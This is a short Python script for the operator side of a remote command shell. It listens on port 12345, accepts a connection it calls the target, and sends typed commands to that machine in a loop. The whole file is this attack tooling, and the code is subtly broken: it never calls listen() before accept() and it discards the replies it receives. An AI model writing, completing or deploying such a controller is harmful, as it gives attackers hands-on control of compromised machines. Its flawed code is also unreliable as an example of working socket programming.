import socket

server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0',12345))

target_socket,addr = server_socket.accept()

while True:
    command = input(">> ")
    if command.lower() == 'exit':
        target_socket.send(b'exit')
        break

    target_socket.send(command.encode())
    target_socket.recv(4096).decode()

target_socket.close()
server_socket.close()